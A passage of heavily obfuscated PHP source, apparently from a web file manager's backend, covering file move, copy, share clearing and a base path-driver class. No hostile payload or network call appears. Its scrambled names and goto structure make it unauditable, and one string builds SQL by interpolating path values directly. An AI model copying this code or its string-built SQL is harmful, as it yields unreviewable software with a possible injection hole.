$„†™Ñ€” = REPEAT_RENAME; } $‚Ÿş¶¸ó = $this->_childrenListSelect($•Åƒñë«); foreach ($‚Ÿş¶¸ó as $ıÅ´Ïæ) { $this->_move($ıÅ´Ïæ[$ÅÇ‚”•°[181]], $à§Á­ì, $„†™Ñ€”, $ÛŠôã İ); } $æ´Ûº = !0; } } else { if ($„†™Ñ€” == REPEAT_SKIP) { $æ´Ûº = !0; } else { if ($„†™Ñ€” == REPEAT_RENAME || $„†™Ñ€” == REPEAT_RENAME_FOLDER) { $öëœÖÓ = $this->fileNameAuto($ÄÖ±Á, $öëœÖÓ, $„†™Ñ€”, $ãöÏæØ); $ÂÈ¡ÅÍˆ = $this->_moveForce($•Åƒñë«, $ÄÖ±Á, $öëœÖÓ); } else { if ($„†™Ñ€” == REPEAT_REPLACE) { $™Š†ÔÙ = $this->sourceInfoCache($à§Á­ì); $øğöÄ…ğ = $this->fileHistory($™Š†ÔÙ, $ñÍ‡ùñÇ[$ÅÇ‚”•°[509]], $ñÍ‡ùñÇ[$ÅÇ‚”•°[76]]); $æ´Ûº = !0; if ($øğöÄ…ğ) { $ÛŠôã İ[$ÅÇ‚”•°[598]][] = $ñÍ‡ùñÇ[$ÅÇ‚”•°[509]]; } } } } } if ($æ´Ûº && !$ÛŠôã İ[$ÅÇ‚”•°[629]]) { $ÛŠôã İ[$ÅÇ‚”•°[629]] = !0; } return $ÂÈ¡ÅÍˆ; } private function _moveForce($…‡¡³ÏÅ, $êŠ´ş¿, $¦™‰ö¹â) { $ÙÓãÎ¾à =& $_SERVER[³½¬ÚË¯]; $¬ç¸ûó = $this->sourceInfo($…‡¡³ÏÅ); $½«›¡Óà = $this->sourceInfo($êŠ´ş¿); $ŠìÙÄ–ë = $¬ç¸ûó[$ÙÓãÎ¾à[453]] == $ÙÓãÎ¾à[88]; $Ğèª²ü´ = array($ÙÓãÎ¾à[445] => $½«›¡Óà[$ÙÓãÎ¾à[181]], $ÙÓãÎ¾à[621] => $½«›¡Óà[$ÙÓãÎ¾à[554]] . $½«›¡Óà[$ÙÓãÎ¾à[181]] . $ÙÓãÎ¾à[50], $ÙÓãÎ¾à[617] => $½«›¡Óà[$ÙÓãÎ¾à[178]], $ÙÓãÎ¾à[618] => $½«›¡Óà[$ÙÓãÎ¾à[539]], $ÙÓãÎ¾à[620] => USER_ID, $ÙÓãÎ¾à[462] => $¦™‰ö¹â); $æİËÛ±€ = $¬ç¸ûó[$ÙÓãÎ¾à[178]] == SourceModel::TYPE_GROUP && $½«›¡Óà[$ÙÓãÎ¾à[178]] == SourceModel::TYPE_GROUP && $¬ç¸ûó[$ÙÓãÎ¾à[539]] == $½«›¡Óà[$ÙÓãÎ¾à[539]]; if (!$æİËÛ±€ && $this->moveClearAuth) { Model($ÙÓãÎ¾à[536])->authClear($…‡¡³ÏÅ); } $Ó£´íğ = $¬ç¸ûó[$ÙÓãÎ¾à[473]] == $ÙÓãÎ¾à[88] && $½«›¡Óà[$ÙÓãÎ¾à[473]] != $ÙÓãÎ¾à[88]; if ($Ó£´íğ) { $Ğèª²ü´[$ÙÓãÎ¾à[472]] = 0; } if ($ŠìÙÄ–ë) { $›ê¥ºƒ = array($ÙÓãÎ¾à[621] => array($ÙÓãÎ¾à[581], $¬ç¸ûó[$ÙÓãÎ¾à[554]] . $¬ç¸ûó[$ÙÓãÎ¾à[181]] . $ÙÓãÎ¾à[582])); $¾æº…Â  = $¬ç¸ûó[$ÙÓãÎ¾à[554]] . $¬ç¸ûó[$ÙÓãÎ¾à[181]] . $ÙÓãÎ¾à[50]; $ûæò´  = $½«›¡Óà[$ÙÓãÎ¾à[554]] . $½«›¡Óà[$ÙÓãÎ¾à[181]] . $ÙÓãÎ¾à[50] . $¬ç¸ûó[$ÙÓãÎ¾à[181]] . $ÙÓãÎ¾à[50]; $§œ¦÷¢æ = array($ÙÓãÎ¾à[621] => array($ÙÓãÎ¾à[630], "\x72\145\160\x6c\x61\143\x65\x28\160\x61\x72\145\x6e\x74\x4c\x65\166\145\154\x2c\47{$¾æº…Â }\x27\x2c\47{$ûæò´ }\x27\51"), $ÙÓãÎ¾à[617] => $½«›¡Óà[$ÙÓãÎ¾à[178]], $ÙÓãÎ¾à[618] => $½«›¡Óà[$ÙÓãÎ¾à[539]]); if ($Ó£´íğ) { $§œ¦÷¢æ[$ÙÓãÎ¾à[472]] = 0; } $this->where($›ê¥ºƒ)->data($§œ¦÷¢æ)->save(); } $this->where(array($ÙÓãÎ¾à[459] => $…‡¡³ÏÅ))->data($Ğèª²ü´)->save(); return $…‡¡³ÏÅ; } private function clearShare($×î¨úÑ», $äƒ‹Ú) { $¿ŒéÅè =& $_SERVER[³½¬ÚË¯]; $® Ìáª = $this->sourceInfo($×î¨úÑ»); $µ‚ş®“Ş = $this->sourceInfo($äƒ‹Ú); if ($® Ìáª[$¿ŒéÅè[539]] == $µ‚ş®“Ş[$¿ŒéÅè[539]] && $® Ìáª[$¿ŒéÅè[178]] == $¿ŒéÅè[631]) { return; } $¦àÉİå = array($¿ŒéÅè[554] => array($¿ŒéÅè[581], $® Ìáª[$¿ŒéÅè[554]] . $×î¨úÑ» . $¿ŒéÅè[582])); $ßÂ‹åğ¢ = $this->field($¿ŒéÅè[459])->where($¦àÉİå)->getField($¿ŒéÅè[181], !0); if (!$ßÂ‹åğ¢) { return; } $¦àÉİå = array($¿ŒéÅè[181] => array($¿ŒéÅè[7], $ßÂ‹åğ¢), $¿ŒéÅè[632] => 1); $è™ïœŠö = Model($¿ŒéÅè[633])->field($¿ŒéÅè[634])->where($¦àÉİå)->select(); if (!$è™ïœŠö) { return; } $è™ïœŠö = array_to_keyvalue($è™ïœŠö, $¿ŒéÅè[12], $¿ŒéÅè[634]); $¦àÉİå = array($¿ŒéÅè[634] => array($¿ŒéÅè[7], $è™ïœŠö)); Model($¿ŒéÅè[633])->where($¦àÉİå)->save(array($¿ŒéÅè[632] => 0)); Model($¿ŒéÅè[635])->where($¦àÉİå)->delete(); } public function copyFolderFromIO($ê¾õü¼, $øÜÉõ¢ß, $úÀéŒ²ˆ, $›ß˜Óæ, $÷…Ó´Ş, $å¯Á³ç½ = false) { $Ù±£îÕŒ =& $_SERVER[³½¬ÚË¯]; $¤¢…ßÆ› = array($Ù±£îÕŒ[599] => array(), $Ù±£îÕŒ[600] => array(), $Ù±£îÕŒ[598] => array(), $Ù±£îÕŒ[636] => array()); $¹¬ú¢ = $å¯Á³ç½ ? $å¯Á³ç½ : $ê¾õü¼->pathThis($øÜÉõ¢ß); $º¦Ÿ •¸ = $this->fileNameExist($úÀéŒ²ˆ, $¹¬ú¢); $ß¥ÜŠÛ = $this->mkdir($úÀéŒ²ˆ, $¹¬ú¢, $›ß˜Óæ); if (!$º¦Ÿ •¸ || $›ß˜Óæ == REPEAT_RENAME_FOLDER) { $›ß˜Óæ = !1; } if ($º¦Ÿ •¸) { $this->_childrenAllMake($º¦Ÿ •¸); } Hook::trigger($Ù±£îÕŒ[637]); $this->_copyChildTo($ê¾õü¼, $øÜÉõ¢ß, $ß¥ÜŠÛ, $›ß˜Óæ, $¤¢…ßÆ›, $÷…Ó´Ş); Hook::trigger($Ù±£îÕŒ[638]); if ($ß¥ÜŠÛ) { $this->folderSizeResetChildren($ß¥ÜŠÛ); } $this->_childrenListClear(); Model($Ù±£îÕŒ[601])->addAll($¤¢…ßÆ›[$Ù±£îÕŒ[599]], array(), !0); Model($Ù±£îÕŒ[602])->eventCopy($ß¥ÜŠÛ); $this->saveAll($¤¢…ßÆ›[$Ù±£îÕŒ[600]]); Model($Ù±£îÕŒ[512])->linkAdd($¤¢…ßÆ›[$Ù±£îÕŒ[598]]); Model($Ù±£îÕŒ[512])->remove($¤¢…ßÆ›[$Ù±£îÕŒ[636]]); $this->folderSizeReset($úÀéŒ²ˆ); $this->updateModifyTime($úÀéŒ²ˆ); return $ß¥ÜŠÛ; } private function _copyChildTo($çõö€Ú, $ÎÇß¯ù, $œà±»¯¨, $÷÷„ş¯, &$á‰š²õ, $ıæğçÁø) { $¶®«§ÈÉ =& $_SERVER[³½¬ÚË¯]; $æ¨—àèÌ = $this->sourceInfoCache($œà±»¯¨); $ª«†–Œ§ = $çõö€Ú->listPath($ÎÇß¯ù); $ª«†–Œ§ = $ª«†–Œ§ ? $ª«†–Œ§ : array($¶®«§ÈÉ[83] => array(), $¶®«§ÈÉ[82] => array()); $Ü³°òï = array_merge($ª«†–Œ§[$¶®«§ÈÉ[83]], $ª«†–Œ§[$¶®«§ÈÉ[82]]); $ïÅÇ¿£¹ = $this->_addFiles($çõö€Ú, $ª«†–Œ§[$¶®«§ÈÉ[83]], $ıæğçÁø); $ïÕŞš© = array(); foreach ($Ü³°òï as &$Îœß±»µ) { if (isset($ïÅÇ¿£¹[$Îœß±»µ[$¶®«§ÈÉ[32]]])) { $Îœß±»µ = $ïÅÇ¿£¹[$Îœß±»µ[$¶®«§ÈÉ[32]]]; } $Îœß±»µ[$¶®«§ÈÉ[453]] = $Îœß±»µ[$¶®«§ÈÉ[33]] == $¶®«§ÈÉ[75]; $Îœß±»µ[$¶®«§ÈÉ[454]] = substr(_get($Îœß±»µ, $¶®«§ÈÉ[175], $¶®«§ÈÉ[12]), 0, 10); $Îœß±»µ[$¶®«§ÈÉ[76]] = _get($Îœß±»µ, $¶®«§ÈÉ[76], 0); $Îœß±»µ[$¶®«§ÈÉ[509]] = _get($Îœß±»µ, $¶®«§ÈÉ[509], 0); if (!isset($Îœß±»µ[$¶®«§ÈÉ[639]]) && $Îœß±»µ[$¶®«§ÈÉ[509]]) { $á‰š²õ[$¶®«§ÈÉ[636]][] = $Îœß±»µ[$¶®«§ÈÉ[509]]; } if ($÷÷„ş¯) { $¸á¢§ = $this->fileNameExistCache($œà±»¯¨, $Îœß±»µ[$¶®«§ÈÉ[32]]); if ($¸á¢§) { if ($Îœß±»µ[$¶®«§ÈÉ[453]] || $÷÷„ş¯ == REPEAT_SKIP) { continue; } if ($÷÷„ş¯ == REPEAT_REPLACE) { $¯ê®¨„ = $this->sourceInfoCache($¸á¢§); $ö¥ğíış = $this->fileHistory($¯ê®¨„, $Îœß±»µ[$¶®«§ÈÉ[509]], $Îœß±»µ[$¶®«§ÈÉ[76]]); if ($ö¥ğíış) { $á‰š²õ[$¶®«§ÈÉ[598]][] = $Îœß±»µ[$¶®«§ÈÉ[509]]; } continue; } else { if ($÷÷„ş¯ == REPEAT_RENAME) { $Îœß±»µ[$¶®«§ÈÉ[32]] = $this->fileNameAutoCache($œà±»¯¨, $Îœß±»µ[$¶®«§ÈÉ[32]], $÷÷„ş¯, !1); } } } } if (!$Îœß±»µ[$¶®«§ÈÉ[453]] && $Îœß±»µ[$¶®«§ÈÉ[509]] == 0) { continue; } if (!$Îœß±»µ[$¶®«§ÈÉ[453]] && $Îœß±»µ[$¶®«§ÈÉ[509]]) { $á‰š²õ[$¶®«§ÈÉ[598]][] = $Îœß±»µ[$¶®«§ÈÉ[509]]; } $ïÕŞš©[] = $this->_makeItemData($Îœß±»µ, $æ¨—àèÌ, $Îœß±»µ[$¶®«§ÈÉ[32]]); } unset($Îœß±»µ); if (!empty($ïÕŞš©)) { $this->addAll($ïÕŞš©); $this->_childrenListSelect($œà±»¯¨); } $àå‹óàÏ = $this->_childrenList($œà±»¯¨); $àå‹óàÏ = array_to_keyvalue($àå‹óàÏ, $¶®«§ÈÉ[32]); foreach ($Ü³°òï as $Îœß±»µ) { $¯ê®¨„ = $àå‹óàÏ[$Îœß±»µ[$¶®«§ÈÉ[32]]]; $ÖÎ»îÛĞ = $¯ê®¨„[$¶®«§ÈÉ[181]]; $this->_copyApplyMeta($¯ê®¨„, $á‰š²õ); if ($Îœß±»µ[$¶®«§ÈÉ[33]] == $¶®«§ÈÉ[75]) { $Îœß±»µ[$¶®«§ÈÉ[84]] = $çõö€Ú->getPathInner($Îœß±»µ[$¶®«§ÈÉ[84]]); $this->_copyChildTo($çõö€Ú, $Îœß±»µ[$¶®«§ÈÉ[84]], $ÖÎ»îÛĞ, $÷÷„ş¯, $á‰š²õ, $ıæğçÁø); } } } private function _addFiles($Ÿ¸¨çÏ, $§úàèÅ·, $Ùã–ıüÓ) { $—›ÉÉí® =& $_SERVER[³½¬ÚË¯]; if (!$§úàèÅ· || count($§úàèÅ·) == 0) { return array(); } $¸Ïçñ©† = array(); foreach ($§úàèÅ· as &$îèîæª‹) { Hook::trigger($—›ÉÉí®[640], $îèîæª‹); $îèîæª‹[$—›ÉÉí®[84]] = $Ÿ¸¨çÏ->getPathInner($îèîæª‹[$—›ÉÉí®[84]]); $Œ¥òÌ¬ı = $Ÿ¸¨çÏ->hashSimple($îèîæª‹[$—›ÉÉí®[84]]); $‹Ú¦Åë½ = $Ÿ¸¨çÏ->hashMd5($îèîæª‹[$—›ÉÉí®[84]]); if (strlen($‹Ú¦Åë½) > 10 && !isset($¸Ïçñ©†[$‹Ú¦Åë½])) { $¸Ïçñ©†[$‹Ú¦Åë½] = array(); } $îèîæª‹[$—›ÉÉí®[641]] = $Œ¥òÌ¬ı; $îèîæª‹[$—›ÉÉí®[515]] = $‹Ú¦Åë½; $¸Ïçñ©†[$‹Ú¦Åë½][] =& $îèîæª‹; if (count($¸Ïçñ©†[$‹Ú¦Åë½]) > 1) { $îèîæª‹[$—›ÉÉí®[639]] = !0; } Hook::trigger($—›ÉÉí®[642], $îèîæª‹); } unset($îèîæª‹); $ô©×ùÃ³ = array($—›ÉÉí®[515] => array($—›ÉÉí®[7], array_keys($¸Ïçñ©†))); $É‡¯ñÙ = Model($—›ÉÉí®[643]); $Ç¿©™Š = $É‡¯ñÙ->where($ô©×ùÃ³)->select(); $Ç¿©™Š = $Ç¿©™Š ? $Ç¿©™Š : array(); foreach ($Ç¿©™Š as $ìúÜÓóÅ) { if (!isset($¸Ïçñ©†[$ìúÜÓóÅ[$—›ÉÉí®[515]]])) { continue; } $Õï”Ô‰ = $¸Ïçñ©†[$ìúÜÓóÅ[$—›ÉÉí®[515]]]; foreach ($Õï”Ô‰ as &$îèîæª‹) { $îèîæª‹[$—›ÉÉí®[509]] = $ìúÜÓóÅ[$—›ÉÉí®[509]]; $îèîæª‹[$—›ÉÉí®[639]] = !0; } unset($îèîæª‹); } $‚Ñ¢“º = array(); foreach ($§úàèÅ· as $â‹™§Å) { Hook::trigger($—›ÉÉí®[644], $â‹™§Å); if (isset($â‹™§Å[$—›ÉÉí®[639]]) && $â‹™§Å[$—›ÉÉí®[639]]) { Hook::trigger($—›ÉÉí®[645], $â‹™§Å); continue; } $Ÿ€¶åè = $Ÿ¸¨çÏ->getPathInner($â‹™§Å[$—›ÉÉí®[84]]); $íÕí÷‹˜ = $É‡¯ñÙ->addFileMake($Ÿ€¶åè, $â‹™§Å[$—›ÉÉí®[76]], $â‹™§Å[$—›ÉÉí®[641]], $â‹™§Å[$—›ÉÉí®[515]], $â‹™§Å[$—›ÉÉí®[32]], $Ùã–ıüÓ); Hook::trigger($—›ÉÉí®[645], $â‹™§Å); if (!is_array($íÕí÷‹˜)) { continue; } $‚Ñ¢“º[] = $íÕí÷‹˜; } $É‡¯ñÙ->addAll($‚Ñ¢“º); $ô©×ùÃ³ = array($—›ÉÉí®[515] => array($—›ÉÉí®[7], array_keys($¸Ïçñ©†))); $Ç¿©™Š = $É‡¯ñÙ->where($ô©×ùÃ³)->select(); $Ç¿©™Š = $Ç¿©™Š ? $Ç¿©™Š : array(); foreach ($Ç¿©™Š as $ìúÜÓóÅ) { if (!isset($¸Ïçñ©†[$ìúÜÓóÅ[$—›ÉÉí®[515]]])) { continue; } $Ù ò“¯ç =& $¸Ïçñ©†[$ìúÜÓóÅ[$—›ÉÉí®[515]]]; foreach ($Ù ò“¯ç as &$îèîæª‹) { $îèîæª‹[$—›ÉÉí®[509]] = $ìúÜÓóÅ[$—›ÉÉí®[509]]; } unset($îèîæª‹); } $Û©ã“¦ = array(); foreach ($§úàèÅ· as $•‡…··) { $Û©ã“¦[$•‡…··[$—›ÉÉí®[32]]] = $•‡…··; } return $Û©ã“¦; } } goto dÁ×âŞ²”; A½óšµÁõ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¹Õ®Òì =& $_SERVER[³½¬ÚË¯]; $this->objectDriver = array($¹Õ®Òì[60], $¹Õ®Òì[61], $¹Õ®Òì[62], $¹Õ®Òì[63], $¹Õ®Òì[64], $¹Õ®Òì[65], $¹Õ®Òì[66], $¹Õ®Òì[67], $¹Õ®Òì[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¸¢Æğ–Æ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¸¢Æğ–Æ, $_SERVER[³½¬ÚË¯][8]); } return $¸¢Æğ–Æ; } public function iconvApp($£…îì×è) { return $£…îì×è; } public function iconvSystem($ßÕõƒ˜š) { return $ßÕõƒ˜š; } public function iconvTo($¹ë¹ôß›, $ı°¹ ÏÓ, $ÂüñÍè—) { $şîº¤Å… =& $_SERVER[³½¬ÚË¯]; if (!$¹ë¹ôß› || !function_exists($şîº¤Å…[69])) { return $¹ë¹ôß›; } static $ªÆŞµÏü = array(); $œ™óŸ§« = $ı°¹ ÏÓ . $şîº¤Å…[70] . $ÂüñÍè— . $şîº¤Å…[71] . $¹ë¹ôß›; if (isset($ªÆŞµÏü[$œ™óŸ§«])) { return $ªÆŞµÏü[$œ™óŸ§«]; } if (function_exists($şîº¤Å…[72])) { $á†ÏÍÆæ = @mb_convert_encoding($¹ë¹ôß›, $ÂüñÍè—, $ı°¹ ÏÓ); } else { $á†ÏÍÆæ = @iconv($ı°¹ ÏÓ, $ÂüñÍè—, $¹ë¹ôß›); } $á†ÏÍÆæ = $á†ÏÍÆæ ? $á†ÏÍÆæ : $¹ë¹ôß›; if (strstr($á†ÏÍÆæ, $şîº¤Å…[73])) { $á†ÏÍÆæ = str_replace($şîº¤Å…[73], $şîº¤Å…[11], $á†ÏÍÆæ); } $ªÆŞµÏü[$ı°¹ ÏÓ . $şîº¤Å…[70] . $ÂüñÍè— . $şîº¤Å…[71] . $¹ë¹ôß›] = $á†ÏÍÆæ; $ªÆŞµÏü[$ÂüñÍè— . $şîº¤Å…[70] . $ı°¹ ÏÓ . $şîº¤Å…[71] . $¹ë¹ôß›] = $¹ë¹ôß›; $ªÆŞµÏü[$ÂüñÍè— . $şîº¤Å…[70] . $ı°¹ ÏÓ . $şîº¤Å…[71] . $á†ÏÍÆæ] = $¹ë¹ôß›; $ªÆŞµÏü[$ı°¹ ÏÓ . $şîº¤Å…[70] . $ÂüñÍè— . $şîº¤Å…[71] . $á†ÏÍÆæ] = $á†ÏÍÆæ; return $á†ÏÍÆæ; } public function getPathInner($ª­Š¦Ñ·) { $ı‡¼•øå = IO::init($ª­Š¦Ñ·); return $ı‡¼•øå->path; } public function getPathOuter($ƒüø·‰À) { $·ƒªÁ¦ =& $_SERVER[³½¬ÚË¯]; $®»¨Ì— = strlen(trim($this->pathBase, $·ƒªÁ¦[8])); $ƒüø·‰À = substr(trim($ƒüø·‰À, $·ƒªÁ¦[8]), $®»¨Ì—); return $this->pathDriver . $·ƒªÁ¦[8] . ltrim($ƒüø·‰À, $·ƒªÁ¦[8]); } public function isParentOf($Ü¿´Ì¨è, $“¦®¬¬®) { $ÖüäĞÚû =& $_SERVER[³½¬ÚË¯]; $Ü¿´Ì¨è = rtrim(strtolower($Ü¿´Ì¨è), $ÖüäĞÚû[8]) . $ÖüäĞÚû[8]; $“¦®¬¬® = rtrim(strtolower($“¦®¬¬®), $ÖüäĞÚû[8]) . $ÖüäĞÚû[8]; $€Á±à¨„ = strpos($“¦®¬¬®, $Ü¿´Ì¨è) === 0; return $€Á±à¨„; } public function getType() { $Æ²±õ· =& $_SERVER[³½¬ÚË¯]; $Ûù‡Ú—ƒ = str_replace($Æ²±õ·[74], $Æ²±õ·[12], get_class($this)); return strtolower($Ûù‡Ú—ƒ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‰ƒç÷œ™, $ƒ¡æŒœƒ) { $ù•èìÆé =& $_SERVER[³½¬ÚË¯]; $»ÆûùŠ¢ = rtrim($‰ƒç÷œ™, $ù•èìÆé[8]) . $ù•èìÆé[8] . $ƒ¡æŒœƒ; $‹ş§ä³š = $this->exist($»ÆûùŠ¢); return $‹ş§ä³š ? $»ÆûùŠ¢ : !1; } public function setModifyTime($¤³™áÃ…, $ÀƒğÇœ = '') { } public function renameObject($È¢âÙÊ, $Àú²ôù) { $éÀ¯·ÜŸ = $Àú²ôù; $È¢âÙÊ = $this->getPathOuter($È¢âÙÊ); $Àú²ôù = $this->pathFather($È¢âÙÊ) . $Àú²ôù; $İ†Á„¾Ñ = IO::copy($È¢âÙÊ, $this->pathFather($È¢âÙÊ), REPEAT_RENAME_FOLDER, $éÀ¯·ÜŸ); if ($İ†Á„¾Ñ) { IO::remove($È¢âÙÊ); } return $İ†Á„¾Ñ ? $Àú²ôù : !1; } public function tempFile($ÑˆÆ×¿ï = '', $€¡ë¦Ù = '') { if (!$ÑˆÆ×¿ï) { $ÑˆÆ×¿ï = rand_string(15); } $«‰Š™óà = TEMP_FILES . rand_string(15) . $_SERVER[³½¬ÚË¯][8]; @mkdir($«‰Š™óà, DEFAULT_PERRMISSIONS, !0); $íñ‘˜— = $«‰Š™óà . $ÑˆÆ×¿ï; @touch($íñ‘˜—); if ($€¡ë¦Ù) { file_put_contents($íñ‘˜—, $€¡ë¦Ù); } return $íñ‘˜—; } public function tempFileRemve($¾©é²Ì) { @unlink($¾©é²Ì); @rmdir($this->pathFather($¾©é²Ì)); } public function mkfile($™”¤ó©, $ÊÏÌå¤Ù = '', $è“òşù¸ = REPEAT_RENAME) { } public function mkdir($»àƒ˜É¤, $Ü÷ôÕ‘¡ = REPEAT_SKIP) { } public function delFile($»“Ù•—Å) { } public function delFolder($ª“¼óûõ) { } public function copyFile($óšñ´Ùö, $Šô’Ø½æ) { } public function moveFile($‰Ÿç¦¶•, $º÷“µãÎ) { } public function remove($¨®®®œü) { if ($this->isFile($¨®®®œü)) { return $this->delFile($¨®®®œü); } return $this->delFolder($¨®®®œü); } public function rename($– ŠÌÊ¹, $Ë¿áƒ‡) { } public function exist($ÑÍ™ï©Ğ) { } public function findByHash($¨«ÈÊô¥ = '', $®ÈêŸ¡˜ = '') { return !1; } public function isFile($·˜ Âã˜) { } public function isFolder($¢æÓÅÒ) { } public function size($ø÷§õ¢) { } public function info($ºôéå¯Å) { } public function infoSimple($ãñ×‡ ) { return $this->info($ãñ×‡ ); } public function infoAuth($§¿ü¡«­) { return $this->info($§¿ü¡«­); } public function infoFull($Ç×»±¿Œ) { return $this->info($Ç×»±¿Œ); } public function infoFullSimple($ò›Ó€ô) { return $this->info($ò›Ó€ô); } public function infoWithChildren($üƒº˜Ú) { $ïŒòæ…Û =& $_SERVER[³½¬ÚË¯]; static $ÜîŸš¸’ = array(); if (isset($ÜîŸš¸’[$üƒº˜Ú])) { return $ÜîŸš¸’[$üƒº˜Ú]; } $îıÓ¶Ùê = $this->info($üƒº˜Ú); if ($îıÓ¶Ùê && $îıÓ¶Ùê[$ïŒòæ…Û[33]] == $ïŒòæ…Û[75]) { $¨Ñ®‰« = array($ïŒòæ…Û[76] => 0, $ïŒòæ…Û[77] => 0, $ïŒòæ…Û[78] => 0); $this->infoChildren($üƒº˜Ú, $¨Ñ®‰«); $îıÓ¶Ùê[$ïŒòæ…Û[76]] = $¨Ñ®‰«[$ïŒòæ…Û[76]]; $îıÓ¶Ùê[$ïŒòæ…Û[79]] = array($ïŒòæ…Û[80] => $¨Ñ®‰«[$ïŒòæ…Û[77]], $ïŒòæ…Û[81] => $¨Ñ®‰«[$ïŒòæ…Û[78]]); $ÜîŸš¸’[$üƒº˜Ú] = $îıÓ¶Ùê; } return $îıÓ¶Ùê; } public function listPath($¸Ş‰í«, $‡ä•ä ó = false) { } public function has($ãßŒïÜ‘, $şÆØª¼§ = false, $ÁôÇ¾°« = false) { } public function canRead($íÎ­ÔõÑ) { } public function canWrite($‹Üª¢«ô) { } public function getContent($ÒşÜæ¢Û) { } public function setContent($Ñß˜ñˆ£, $çËñ’Ò = '') { } protected function infoChildren($ğçş€Ù…, &$ıù¦ ò) { $¡‡ì³Ó =& $_SERVER[³½¬ÚË¯]; check_abort_echo(); $•‚¯–»… = $this->listPath($ğçş€Ù…, !0); $•‚¯–»… = array_merge($•‚¯–»…[$¡‡ì³Ó[82]], $•‚¯–»…[$¡‡ì³Ó[83]]); foreach ($•‚¯–»… as $±¡õ) { if ($±¡õ[$¡‡ì³Ó[33]] == $¡‡ì³Ó[75]) { $ıù¦ ò[$¡‡ì³Ó[78]]++; $¢¾İÕÂ = $this->getPathInner($±¡õ[$¡‡ì³Ó[84]]); $this->infoChildren($¢¾İÕÂ, $ıù¦ ò); } else { $ıù¦ ò[$¡‡ì³Ó[77]]++; $ıù¦ ò[$¡‡ì³Ó[76]] += $±¡õ[$¡‡ì³Ó[76]]; } } } public function fileSubstr($¾Ï¦äªÓ, $İšŸ¦Ââ, $‹çƒªÔ) { } public function listAll($²ğÈ—) { } public function listAllMake($£«¨•ïÆ, &$âÚ‘‘Üó) { $™õò¥¢¤ =& $_SERVER[³½¬ÚË¯]; check_abort_echo(); $ÃˆúÉ–í = $this->listPath($£«¨•ïÆ, !0); if (!$ÃˆúÉ–í) { return; } $Æ—…èë = array_merge($ÃˆúÉ–í[$™õò¥¢¤[82]], $ÃˆúÉ–í[$™õò¥¢¤[83]]); foreach ($Æ—…èë as $Ôú“ñÒº) { $¿ÔĞ™âÈ = $Ôú“ñÒº[$™õò¥¢¤[33]] == $™õò¥¢¤[75]; $½ëô×¯ = array($™õò¥¢¤[84] => $Ôú“ñÒº[$™õò¥¢¤[84]], $™õò¥¢¤[75] => $¿ÔĞ™âÈ); if (isset($Ôú“ñÒº[$™õò¥¢¤[76]])) { $½ëô×¯[$™õò¥¢¤[76]] = $Ôú“ñÒº[$™õò¥¢¤[76]]; } if (isset($Ôú“ñÒº[$™õò¥¢¤[85]])) { $½ëô×¯[$™õò¥¢¤[85]] = $Ôú“ñÒº[$™õò¥¢¤[85]]; } if (!$¿ÔĞ™âÈ) { $âÚ‘‘Üó[] = $½ëô×¯; continue; } $âÚ‘‘Üó[] = $½ëô×¯; $Ñ‹”¦÷õ = $Ôú“ñÒº[$™õò¥¢¤[84]]; $ÄÂû¥«ş = $this->pathDriver; if (substr($Ôú“ñÒº[$™õò¥¢¤[84]], 0, strlen($ÄÂû¥«ş)) == $ÄÂû¥«ş) { $Ñ‹”¦÷õ = substr($Ñ‹”¦÷õ, strlen($ÄÂû¥«ş)); } $this->listAllMake($Ñ‹”¦÷õ, $âÚ‘‘Üó); } } public function listAllSimple($Ç”Ç›ã›, $ªĞñæºË = false) { $Áñ×Ú£Ì = $this->listAll($Ç”Ç›ã›); return $this->listAllSimpleMake($Áñ×Ú£Ì, $this->getPathOuter($Ç”Ç›ã›), $ªĞñæºË); } public function listAllSimpleMake($¯Ê¯ééÙ, $íı‚¤Í, $ÂşÒ»›ã) { $ÖÒÁ²… =& $_SERVER[³½¬ÚË¯]; $‚…ÇÖ›ü = array(); $íı‚¤Í = rtrim(get_path_father($íı‚¤Í), $ÖÒÁ²…[8]) . $ÖÒÁ²…[8]; foreach ($¯Ê¯ééÙ as $ŠÆÜû³») { $òõ­ÛÂ£ = array($ÖÒÁ²…[84] => $ŠÆÜû³»[$ÖÒÁ²…[84]], $ÖÒÁ²…[86] => $ŠÆÜû³»[$ÖÒÁ²…[84]], $ÖÒÁ²…[75] => $ŠÆÜû³»[$ÖÒÁ²…[75]]); if (isset($ŠÆÜû³»[$ÖÒÁ²…[76]]) && !$ŠÆÜû³»[$ÖÒÁ²…[75]]) { $òõ­ÛÂ£[$ÖÒÁ²…[76]] = $ŠÆÜû³»[$ÖÒÁ²…[76]]; } if (isset($ŠÆÜû³»[$ÖÒÁ²…[85]])) { $òõ­ÛÂ£[$ÖÒÁ²…[85]] = $ŠÆÜû³»[$ÖÒÁ²…[85]]; } if (is_array($ŠÆÜû³»[$ÖÒÁ²…[87]])) { $òõ­ÛÂ£[$ÖÒÁ²…[86]] = $ŠÆÜû³»[$ÖÒÁ²…[87]][$ÖÒÁ²…[84]]; $òõ­ÛÂ£[$ÖÒÁ²…[76]] = $ŠÆÜû³»[$ÖÒÁ²…[87]][$ÖÒÁ²…[76]]; $òõ­ÛÂ£[$ÖÒÁ²…[85]] = $ŠÆÜû³»[$ÖÒÁ²…[87]][$ÖÒÁ²…[85]]; } else { if (substr($ŠÆÜû³»[$ÖÒÁ²…[84]], 0, strlen($íı‚¤Í)) == $íı‚¤Í) { $òõ­ÛÂ£[$ÖÒÁ²…[84]] = substr($ŠÆÜû³»[$ÖÒÁ²…[84]], strlen($íı‚¤Í)); } } $öß–Şïœ = $ŠÆÜû³»[$ÖÒÁ²…[75]] ? $ÖÒÁ²…[8] : $ÖÒÁ²…[12]; $òõ­ÛÂ£[$ÖÒÁ²…[86]] = rtrim($òõ­ÛÂ£[$ÖÒÁ²…[86]], $ÖÒÁ²…[8]) . $öß–Şïœ; $òõ­ÛÂ£[$ÖÒÁ²…[84]] = $ÖÒÁ²…[8] . trim($òõ­ÛÂ£[$ÖÒÁ²…[84]], $ÖÒÁ²…[8]) . $öß–Şïœ; if (!$ÂşÒ»›ã) { $’’‚î®Ù = explode($ÖÒÁ²…[8], trim($òõ­ÛÂ£[$ÖÒÁ²…[84]], $ÖÒÁ²…[8])); $òõ­ÛÂ£[$ÖÒÁ²…[84]] = $ÖÒÁ²…[8] . 